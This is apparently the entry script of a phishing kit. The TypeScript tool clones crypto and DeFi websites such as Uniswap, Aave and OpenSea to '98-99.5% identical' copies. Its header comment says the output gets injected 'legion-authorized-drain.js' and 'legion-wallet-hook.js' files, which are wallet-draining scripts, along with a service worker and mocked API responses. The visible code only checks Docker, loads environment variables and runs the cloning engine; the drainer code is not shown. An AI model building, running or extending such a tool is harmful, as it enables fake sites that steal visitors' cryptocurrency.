/**
 * CLONE PERFECT — Level 2: JavaScript Mastery
 *
 * Enhanced cloning for JavaScript-heavy sites
 *
 * Usage:
 *   pnpm clone-perfect-l2 https://uniswap.org
 *   pnpm clone-perfect-l2 https://app.aave.com
 *   pnpm clone-perfect-l2 https://opensea.io
 *
 * Output: ./clone/[website]-level2-clone/
 *         ├── index.html (98-99.5% identical)
 *         ├── framework-state.json (React/Vue/Angular state)
 *         ├── network-log.json (API responses for mocking)
 *         ├── assets/ (all CSS/JS/images/fonts/videos)
 *         ├── sw.js (service worker for caching)
 *         ├── legion-authorized-drain.js (injected)
 *         ├── legion-wallet-hook.js (injected)
 *         └── clone-manifest.json (validation report)
 *
 * Key features:
 * ✅ Infinite scroll detection + auto-load
 * ✅ React/Vue/Angular/Svelte state capture
 * ✅ Shadow DOM extraction
 * ✅ Lazy-loaded content detection
 * ✅ Dynamic content waiting
 * ✅ WebAssembly module tracking
 * ✅ Service worker generation
 * ✅ Network request logging for API mocking
 * ✅ Multi-viewport rendering
 * ✅ 98-99.5% similarity for JS-heavy sites
 */

import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { ClonePerfectEngineL2 } from './lib/clone-perfect-engine-level2.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')

// Load .env
function loadEnv() {
  const envPath = path.join(REPO_ROOT, '.env')
  if (!existsSync(envPath)) return

  const content = readFileSync(envPath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let val = trimmed.slice(eq + 1).trim()
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = val
    }
  }
}

// Docker check
async function verifyDocker(): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn('docker', ['ps'])
    let hasError = false

    proc.on('error', () => {
      hasError = true
      reject(new Error('Docker not running'))
    })

    proc.on('exit', (code) => {
      if (code === 0 && !hasError) {
        resolve()
      }
    })

    setTimeout(() => {
      if (!hasError) {
        proc.kill()
        resolve()
      }
    }, 5000)
  })
}

async function main() {
  const args = process.argv.slice(2)
  if (args.length === 0) {
    console.error('Usage: pnpm clone-perfect-l2 <url>')
    console.error('Example: pnpm clone-perfect-l2 https://uniswap.org')
    console.error('')
    console.error('Level 2 Features:')
    console.error('  ✅ Infinite scroll auto-loading')
    console.error('  ✅ React/Vue/Angular state capture')
    console.error('  ✅ Shadow DOM extraction')
    console.error('  ✅ Dynamic content detection')
    console.error('  ✅ Network request logging')
    console.error('  ✅ Service worker generation')
    console.error('  ✅ 98-99.5% similarity for JS-heavy sites')
    process.exit(1)
  }

  const targetUrl = args[0]

  try {
    // Verify Docker
    console.error('[clone-perfect-l2] Checking Docker...')
    await verifyDocker()
    console.error('[clone-perfect-l2] ✅ Docker ready')

    // Load env
    loadEnv()

    // Create output directory
    const outputDir = path.join(REPO_ROOT, 'clone')
    mkdirSync(outputDir, { recursive: true })

    // Run cloning engine L2
    console.error('[clone-perfect-l2] Starting Level 2 JavaScript Mastery clone...')
    const engine = new ClonePerfectEngineL2(targetUrl, outputDir)
    const result = await engine.execute()

    if (result.success) {
      console.log(result.clone_dir) // Print to stdout for scripting
      console.error('')
      console.error('📊 Level 2 Metadata:')
      console.error(`  Framework: ${result.metadata.framework_detected || 'None (static site)'}`)
      console.error(`  API Endpoints: ${result.metadata.api_endpoints.length}`)
      console.error(`  WebSocket URLs: ${result.metadata.websocket_urls.length}`)
      console.error(`  Shadow DOMs: ${result.metadata.shadow_doms}`)
      console.error(`  WASM Modules: ${result.metadata.wasm_modules}`)
      console.error(`  Dynamic sections: ${result.metadata.dynamic_content_sections}`)
      console.error(`  Assets: ${result.metadata.assets_count}`)
      console.error(`  Similarity: ${result.metadata.similarity_score}%`)
      console.error(`  Time: ${result.metadata.performance_ms}ms`)
      process.exit(0)
    } else {
      console.error(`[clone-perfect-l2] ❌ ${result.message}`)
      process.exit(1)
    }
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error)
    console.error(`[clone-perfect-l2] ❌ Fatal error: ${msg}`)
    process.exit(1)
  }
}

main()
